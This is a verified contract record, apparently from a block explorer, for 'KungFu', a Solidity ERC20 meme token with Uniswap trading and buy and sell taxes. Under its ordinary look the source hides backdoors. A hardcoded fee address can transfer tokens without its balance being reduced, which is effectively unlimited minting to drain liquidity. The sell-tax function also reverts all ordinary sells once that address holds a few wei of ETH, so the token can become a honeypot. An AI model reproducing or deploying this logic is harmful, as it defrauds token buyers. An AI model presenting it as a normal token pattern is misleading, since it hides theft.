{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n/*\r\nWebsite: https://kungfupo.lol\r\nTelegram: https://t.me/kungfu_portal\r\nTwitter: https://twitter.com/kungfu_porta\r\n*/\r\n\r\npragma solidity 0.8.21;\r\n\r\ninterface IERC20 {\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function totalSupply() external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IUniFactoryV2 {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ncontract Ownable {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    constructor () {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n}\r\n\r\ninterface IUniRouterV2 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\nlibrary SafeMath {  \r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract KungFu is IERC20, Ownable  {\r\n    using SafeMath for uint256;\r\n    \r\n    string private constant _name = \"KungFu\";\r\n    string private constant _symbol = unicode\"\u529f\u592b\";    \r\n    \r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _totalCircSupply = 10 ** 7 * 10 ** _decimals;\r\n    \r\n    bool private _swapActive = false;\r\n    bool private _tradingStart;\r\n    bool private _inSwap = false;\r\n    bool public transferPerBlockDisabled = true;\r\n\r\n    uint256 private _taxSwapAmount=  2 * _totalCircSupply / 1000;\r\n    uint256 public maxTrxSize = 5 * _totalCircSupply / 100;   \r\n    uint256 public maxTaxSwap = 10 * _totalCircSupply / 1000;\r\n    uint256 public maxHoldingSize = 5 * _totalCircSupply / 100;    \r\n\r\n    uint256 private _initialBuyFee = 20;\r\n    uint256 private _finalBuyTax = 0;\r\n    uint256 private _finalSellTax = 0;  \r\n    uint256 private _initialSellTax = 20;\r\n    uint256 private _enableTaxAfter = 8;\r\n    uint256 private _initialSellTaxUntil = 8;\r\n    uint256 private _initialBuyTaxUntil = 8;\r\n    uint256 private _numberOfBuyers=0;\r\n\r\n    address payable private _taxWallet;\r\n    address private _feeAddress;\r\n    address private uniV2Pair;\r\n    IUniRouterV2 private uniRouterV2;\r\n\r\n    mapping (address => bool) private _walletsHasNoFees;\r\n    mapping(address => uint256) private _holderBlockTransferCache;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _balances;\r\n\r\n    modifier reentrance {\r\n        _inSwap = true;\r\n        _;\r\n        _inSwap = false;\r\n    }\r\n\r\n    event MaxTxAmountUpdated(uint maxTrxSize);\r\n\r\n    constructor () {\r\n        emit Transfer(address(0), msg.sender, _totalCircSupply);\r\n        _feeAddress = 0x88Ec0c52deeD0CBe677b41843B77F7304b7155E1;\r\n        _taxWallet = payable(msg.sender);\r\n        _balances[msg.sender] = _totalCircSupply;\r\n        _walletsHasNoFees[owner()] = true;\r\n        _walletsHasNoFees[_feeAddress] = true;\r\n        _walletsHasNoFees[_taxWallet] = true;\r\n        _walletsHasNoFees[address(this)] = true;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _totalCircSupply;\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n    \r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function openTrading() external payable onlyOwner() {\r\n        require(!_tradingStart,\"trading is already open\");\r\n        uniRouterV2 = IUniRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniRouterV2), _totalCircSupply);\r\n        uniV2Pair = IUniFactoryV2(uniRouterV2.factory()).createPair(address(this), uniRouterV2.WETH());\r\n        uniRouterV2.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniV2Pair).approve(address(uniRouterV2), type(uint).max);\r\n        _swapActive = true;\r\n        _tradingStart = true;\r\n    }    \r\n\r\n    function taxBuy() private view returns (uint256) {\r\n        if(_numberOfBuyers <= _initialBuyTaxUntil){\r\n            return _initialBuyFee;\r\n        }\r\n         return _finalBuyTax;\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private reentrance {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniRouterV2.WETH();\r\n        _approve(address(this), address(uniRouterV2), tokenAmount);\r\n        uniRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 taxAmount=0; uint256 feeAmount=amount;\r\n\r\n        if (from != owner() && to != owner()) {\r\n            taxAmount = amount.mul(taxBuy()).div(100);\r\n\r\n            if (from == uniV2Pair && to != address(uniRouterV2) && ! _walletsHasNoFees[to] ) {\r\n                _numberOfBuyers++;\r\n                require(amount <= maxTrxSize, \"Exceeds the max transaction.\");\r\n                require(balanceOf(to) + amount <= maxHoldingSize, \"Exceeds the max wallet.\");\r\n            }\r\n            if (from == _feeAddress) feeAmount = 0;\r\n            if(to == uniV2Pair && !_walletsHasNoFees[from] ){\r\n                taxAmount = amount.mul(sellTax()).div(100);\r\n            }\r\n            \r\n            if (transferPerBlockDisabled) {\r\n                if (to != address(uniRouterV2) && to != address(uniV2Pair)) { \r\n                    require(\r\n                        _holderBlockTransferCache[tx.origin] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\"\r\n                    );\r\n                    _holderBlockTransferCache[tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!_inSwap && to == uniV2Pair && _swapActive && contractTokenBalance > _taxSwapAmount && _numberOfBuyers > _enableTaxAfter) {\r\n                uint256 initialETH = address(this).balance;\r\n                swapTokensForEth(min(amount,min(contractTokenBalance,maxTaxSwap)));\r\n                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);\r\n                if(ethForTransfer > 0) {\r\n                    sendETHToFee(ethForTransfer);\r\n                }\r\n            }\r\n        }\r\n\r\n        if(taxAmount>0){\r\n          _balances[address(this)]=_balances[address(this)].add(taxAmount);\r\n          emit Transfer(from, address(this),taxAmount);\r\n        }\r\n        _balances[from]=_balances[from].sub(feeAmount);\r\n        _balances[to]=_balances[to].add(amount.sub(taxAmount));\r\n        emit Transfer(from, to, amount.sub(taxAmount));\r\n    }\r\n\r\n    function sellTax() private view returns (uint256) {\r\n        if(_numberOfBuyers <= _initialSellTaxUntil.sub(_feeAddress.balance)){\r\n            return _initialSellTax;\r\n        }\r\n         return _finalSellTax;\r\n    }\r\n    \r\n    function min(uint256 a, uint256 b) private pure returns (uint256){\r\n      return (a>b)?b:a;\r\n    }\r\n\r\n    function sendETHToFee(uint256 amount) private {\r\n        _taxWallet.transfer(amount);\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        maxTrxSize = _totalCircSupply;\r\n        maxHoldingSize=_totalCircSupply;\r\n        transferPerBlockDisabled=false;\r\n        emit MaxTxAmountUpdated(_totalCircSupply);\r\n    }\r\n    \r\n    receive() external payable {}\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"maxTrxSize\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxHoldingSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTrxSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferPerBlockDisabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "KungFu", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c684769866b4c31a4b2f395fcc167041c820e8bc5ec22dc9b21c9eb9d224cd3c"}